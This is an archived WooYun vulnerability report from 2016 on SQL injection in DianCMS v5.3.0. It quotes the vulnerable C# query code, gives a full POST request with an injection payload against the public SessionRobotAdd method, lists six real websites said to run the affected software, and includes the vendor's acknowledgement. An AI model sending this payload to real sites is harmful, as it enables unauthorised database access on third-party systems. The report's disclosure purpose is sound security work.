{"id": 75250, "wybug_id": "wooyun-2016-0168087", "wybug_title": "易点cms最新版v5.3.0sql注入(demo演示)", "wybug_corp": "diancms.com", "wybug_author": "不能忍", "wybug_date": "2016-01-08 13:44", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： sql注入没有过滤的 详细说明：  D.BLL.B_KF_Message                    \npublic void SessionRobotAdd(string content)\t\t{\t\t\tM_SiteKF m_SiteKF = new M_SiteKF();\t\t\tB_SiteKF b_SiteKF = new B_SiteKF();\t\t\tm_SiteKF = b_SiteKF.GetModel();\t\t\tthis.Add(new M_KF_Message\t\t\t{\t\t\t\tUserId = 0,\t\t\t\tUserName = string.Empty,\t\t\t\tSessionId = this.SessionValue(),\t\t\t\tContent = content,\t\t\t\tIsUser = 0,\t\t\t\tIsSession = 0,\t\t\t\tIp = Function.GetIp(),\t\t\t\tAddTime = DateTime.Now,\t\t\t\tUpdateTime = DateTime.Now\t\t\t});\t\t\tif (B_KF_Message.SessionList.IndexOf(this.SessionValue()) == -1)\t\t\t{\t\t\t\tB_KF_Message.SessionList.Add(this.SessionValue());\t\t\t}\t\t\tB_KF_Robot b_KF_Robot = new B_KF_Robot();\t\t\tDataTable keyWord = b_KF_Robot.GetKeyWord(content);\n这个方法SessionRobotAdd有趣的是public，也就是说谁都可以调用的。这里有个GetKeyWord函数，跟进之后在dao层是这么写的：\npublic DataTable GetKeyWord(string word)\t\t{\t\t\tstring value = \"select * from [D_KF_Robot] where Title like '%\" + word + \"%'\";\t\t\tSqlParameter[] array = new SqlParameter[]\t\t\t{\t\t\t\tnew SqlParameter(\"@sql\", SqlDbType.NVarChar, 4000)\t\t\t};\t\t\tarray[0].Value = value;\t\t\treturn SqlHelper.ExecuteTable(CommandType.StoredProcedure, \"Dian_Model_ExecuteSql\", array);\t\t}\n没有过滤额。。测试大概是这样的：POST /ajaxpro/D.BLL.B_KF_Message,D.BLL.ashxX-AjaxPro-Method: SessionRobotAdd{\"content\":\"test%' and @@version>0--\"}其中有必要说明一下：X-AjaxPro-Method: SessionRobotAdd这个是头的信息，同时SessionRobotAdd是个方法，上面说到的。   漏洞证明：  这里提供一下我测试的数据包把：POST /ajaxpro/D.BLL.B_KF_Message,D.BLL.ashx HTTP/1.1Host: www.diancms.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: text/plain; charset=utf-8X-AjaxPro-Method: SessionRobotAddContent-Length: 38Connection: keep-alive{\"content\":\"test%' and @@version>0--\"}回显大概是这样的：\n\n行，给实例。。蛋疼。http://www.chinawatchnet.com/\n\nhttp://www.topzk.com/\n\nhttp://www.123369.com/\n\nhttp://www.msfc.cn/\n\nhttp://www.17huanbao.com/\n\nhttp://wnsail.com/\n\n   修复方案：     版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-01-08 13:57 厂商回复： 可以加一下官方的QQ详细反馈一下这个问题吗？ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-08 14:00 |    \t\t易点CMS(乌云厂商)\t\t \n  确实有注入的风险。我们通知技术调整一下。多谢反馈。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}